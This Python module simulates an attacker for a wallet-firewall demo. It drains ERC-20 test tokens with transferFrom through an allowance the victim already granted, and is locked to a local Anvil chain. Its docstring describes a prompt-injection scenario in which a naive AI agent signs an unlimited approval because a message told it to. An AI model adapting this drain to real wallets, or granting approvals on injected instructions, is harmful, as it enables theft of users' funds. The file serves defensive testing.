"""Attacker simulation for the attack replay (Person 1, issue #10). LOCAL CHAIN ONLY.

Why this exists: an unlimited token approval lets the approved address pull tokens out of the
victim's wallet, again and again, without asking. The demo shows a naive agent that signs such an
approval (because a message told it to) and then loses its test tokens, while Sundarban's
firewall refuses the approval in the first place (rule APR-01).

The drainer plays the attacker: with an allowance the victim already granted, it calls
transferFrom(victim, attacker, amount) signed by the ATTACKER key.

Hard limits (all enforced in code, in this order, before any transaction is sent):
  * ACTIVE_NETWORK must be "local"
  * the node's chain id must be 31337 (plain local Anvil)
  * ATTACKER_PRIVATE_KEY must be set; it is only ever used here and is never printed or logged
Test tokens only. It cannot do anything the allowance does not already permit.

Use:
    from wallet_engine.attacks.drainer import drain
    result = drain()            # take as much as the allowance and balance allow
    result = drain("25")        # or a specific amount, in token units
or from a shell:  python -m wallet_engine.attacks.drainer [amount]
"""
import os
import sys
from dataclasses import dataclass

from web3 import Web3

from .. import chain, erc20
from ..execute import _fee_fields, _hex

LOCAL_CHAIN_ID = 31337
RECEIPT_TIMEOUT = 60


class DrainRefused(RuntimeError):
    """The drain was not attempted (or is impossible). Nothing was sent. Safe to show to a user."""


@dataclass
class DrainResult:
    tx_hash: str
    token: str
    victim: str
    attacker: str
    amount: str                 # token units actually taken
    victim_before: str
    victim_after: str
    attacker_before: str
    attacker_after: str
    allowance_after: str        # "unlimited" stays "unlimited": it is never used up


def attacker_address() -> str:
    key = os.getenv("ATTACKER_PRIVATE_KEY")
    if not key:
        raise DrainRefused("ATTACKER_PRIVATE_KEY is not set in .env")
    return Web3().eth.account.from_key(key).address


def _local_web3() -> Web3:
    """Return a connected Web3, but only for the local development chain."""
    if chain.network() != "local":
        raise DrainRefused(f"The drainer runs on the local chain only (ACTIVE_NETWORK is '{chain.network()}')")
    w3 = chain.get_web3()
    if not w3.is_connected():
        raise DrainRefused("Cannot reach the local blockchain node. Is anvil running?")
    if w3.eth.chain_id != LOCAL_CHAIN_ID:
        raise DrainRefused(f"Refusing to run: chain id is {w3.eth.chain_id}, not the local chain ({LOCAL_CHAIN_ID})")
    return w3


def drain(amount: str | None = None) -> DrainResult:
    """Pull tokens from the victim wallet using the allowance it granted to the attacker."""
    w3 = _local_web3()
    key = os.getenv("ATTACKER_PRIVATE_KEY")
    if not key:
        raise DrainRefused("ATTACKER_PRIVATE_KEY is not set in .env")
    attacker = w3.eth.account.from_key(key)
    victim = chain.wallet_address()
    token = erc20.token_contract(w3, chain.token_address())
    if not w3.eth.get_code(token.address):
        raise DrainRefused("TestUSD is not deployed on this chain. Run wallet_engine/scripts/deploy.py")
    if attacker.address.lower() == victim.lower():
        raise DrainRefused("Attacker and victim are the same account; check ATTACKER_PRIVATE_KEY")

    decimals = token.functions.decimals().call()
    allowance = token.functions.allowance(victim, attacker.address).call()
    balance = token.functions.balanceOf(victim).call()
    if allowance == 0:
        raise DrainRefused("The attacker has no allowance from the victim: nothing to drain")
    if balance == 0:
        raise DrainRefused("The victim holds no tokens")

    if amount is None:
        raw = min(allowance, balance)
    else:
        try:
            raw = erc20.to_base_units(amount, decimals)
        except ValueError as exc:
            raise DrainRefused(f"Invalid amount: {exc}")
        if raw == 0:
            raise DrainRefused("Amount must be greater than zero")
        if raw > allowance:
            raise DrainRefused(f"Amount exceeds the allowance ({erc20.from_base_units(allowance, decimals)})")
        if raw > balance:
            raise DrainRefused(f"Amount exceeds the victim's balance ({erc20.from_base_units(balance, decimals)})")

    attacker_before = token.functions.balanceOf(attacker.address).call()
    tx = token.functions.transferFrom(victim, attacker.address, raw).build_transaction({
        "from": attacker.address,
        "nonce": w3.eth.get_transaction_count(attacker.address, "pending"),
        "chainId": w3.eth.chain_id,
        **_fee_fields(w3),
    })
    signed = attacker.sign_transaction(tx)
    tx_hash = _hex(w3.eth.send_raw_transaction(signed.raw_transaction))
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=RECEIPT_TIMEOUT)
    if receipt.status != 1:
        raise DrainRefused(f"The drain transaction failed on-chain ({tx_hash})")

    return DrainResult(
        tx_hash=tx_hash,
        token=token.address,
        victim=victim,
        attacker=attacker.address,
        amount=erc20.from_base_units(raw, decimals),
        victim_before=erc20.from_base_units(balance, decimals),
        victim_after=erc20.from_base_units(token.functions.balanceOf(victim).call(), decimals),
        attacker_before=erc20.from_base_units(attacker_before, decimals),
        attacker_after=erc20.from_base_units(token.functions.balanceOf(attacker.address).call(), decimals),
        allowance_after=erc20.from_base_units(token.functions.allowance(victim, attacker.address).call(), decimals),
    )


def main(argv: list[str]) -> int:
    amount = argv[1] if len(argv) > 1 else None
    try:
        r = drain(amount)
    except DrainRefused as exc:
        print(f"REFUSED: {exc}")
        return 1
    print(f"DRAINED {r.amount} TUSD  victim {r.victim_before} -> {r.victim_after}  "
          f"attacker {r.attacker_before} -> {r.attacker_after}")
    print(f"tx {r.tx_hash}   allowance left: {r.allowance_after}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
